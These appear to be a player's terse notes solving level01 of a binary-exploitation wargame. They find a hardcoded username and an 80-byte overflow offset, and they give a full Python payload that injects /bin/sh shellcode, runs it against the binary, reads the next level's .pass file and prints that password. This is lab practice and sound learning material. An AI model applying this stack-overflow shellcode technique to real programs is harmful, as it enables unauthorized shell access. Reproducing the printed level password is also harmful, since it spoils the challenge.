checking functions, no syscall, it's shellcode time

info vars -> 0x0804a040  a_user_name

cat binary and find all non encoded shit to try for username, 
"dat_wil" works


use maxonchiks method to find the offset for buff overflow(https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), 80

so the line be: "dat_wil" + (shellcode + "\n" + garbage to get to 80) + shellcode addr

shellcode addr = beginning of memory for vars, that being the beginning of "dat_will" + 7 => 0x0804a040 + 7

shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php



checkity check:

python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/pepe

cat /tmp/pepe - | ./level01

cat /home/users/level02/.pass

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
